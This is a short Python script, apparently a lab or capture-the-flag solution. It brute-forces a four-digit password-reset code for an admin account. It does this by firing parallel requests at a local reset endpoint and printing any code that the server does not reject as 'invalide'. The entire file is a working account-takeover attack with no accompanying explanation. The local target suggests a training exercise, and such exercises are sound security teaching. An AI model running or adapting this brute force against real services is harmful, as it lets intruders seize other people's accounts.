import requests
from multiprocessing import Pool

address = "http://localhost:6007"

def try_code(code):
    print(".", end="", flush=True)
    text = requests.get(f"{address}/reset?email=admin%40gouv.qc.ca&code={code}").text
    if not "invalide" in text:
        print(f"Found code: {code}")
        print(text)

if __name__ == "__main__":
    # Solution using thread pool
    p = Pool(8)
    p.map(try_code, range(1000, 10000))
